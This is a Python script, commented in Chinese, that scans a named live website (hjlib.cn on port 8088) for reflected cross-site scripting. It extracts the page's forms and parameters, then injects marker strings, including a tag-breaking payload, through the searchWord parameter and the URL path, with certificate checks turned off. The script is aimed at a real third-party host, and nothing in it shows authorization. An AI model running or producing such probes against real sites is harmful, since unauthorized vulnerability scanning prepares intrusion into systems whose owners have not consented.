#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
hjlib.cn XSS - 使用searchWord参数测试
"""

import requests
import urllib3
import re
import time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "text/html,*/*",
})

TAG = "85f7210c60a00209b3858749ec04d4d6"
marker = f"web_xss_in_tag={TAG}"

# 先获取完整页面，找到form和所有参数
url = "http://www.hjlib.cn:8088/navigation/oldNavigationFacet.do"
resp = session.get(url, timeout=10, verify=False)

# 提取所有form
forms = re.findall(r'<form[^>]*>(.*?)</form>', resp.text, re.DOTALL)
for i, form in enumerate(forms):
    print(f"表单 {i}: {form[:300]}")
    print()

# 提取所有input
inputs = re.findall(r'<input[^>]*>', resp.text)
for inp in inputs:
    print(f"Input: {inp}")

# 提取所有select
selects = re.findall(r'<select[^>]*>(.*?)</select>', resp.text, re.DOTALL)
for sel in selects:
    print(f"Select: {sel[:200]}")

print("\n--- 搜索参数名 ---")
# 搜索js中的参数名
js_params = re.findall(r'(\w+)\s*[:=]\s*(?:document\.|get|post|ajax|param)', resp.text)
print(f"JS参数: {js_params}")

# 搜索URL中的参数
url_params = re.findall(r'[?&](\w+)=', resp.text)
print(f"URL参数: {list(set(url_params))}")

# 尝试用searchWord参数
print("\n--- XSS测试 ---")
xss_params_list = [
    {"searchWord": marker},
    {"searchWord": '"><' + marker + '>'},
    {"searchWord": "' " + marker},
    {"searchWord": "test " + marker},
]

for params in xss_params_list:
    try:
        resp = session.get(url, params=params, timeout=8, verify=False)
        if "web_xss_in_tag" in resp.text or TAG in resp.text:
            idx = resp.text.find(TAG)
            ctx = resp.text[max(0,idx-80):idx+80]
            print(f"✅ 反射! 参数: {params}")
            print(f"   上下文: {ctx[:140]}")
        else:
            print(f"❌ 不反射: {list(params.keys())}")
    except Exception as e:
        print(f"❌ {e}")
    time.sleep(0.2)

# 尝试直接在URL path中注入
print("\n--- URL路径注入 ---")
path_tests = [
    f"/navigation/oldNavigationFacet.do/{marker}",
    f"/navigation/oldNavigationFacet.do;{marker}",
]
for p in path_tests:
    try:
        resp = session.get(f"http://www.hjlib.cn:8088{p}", timeout=8, verify=False)
        if TAG in resp.text:
            print(f"✅ 路径注入: {p}")
        else:
            print(f"❌ 路径不反射: {p}")
    except Exception as e:
        print(f"❌ {e}")
    time.sleep(0.2)
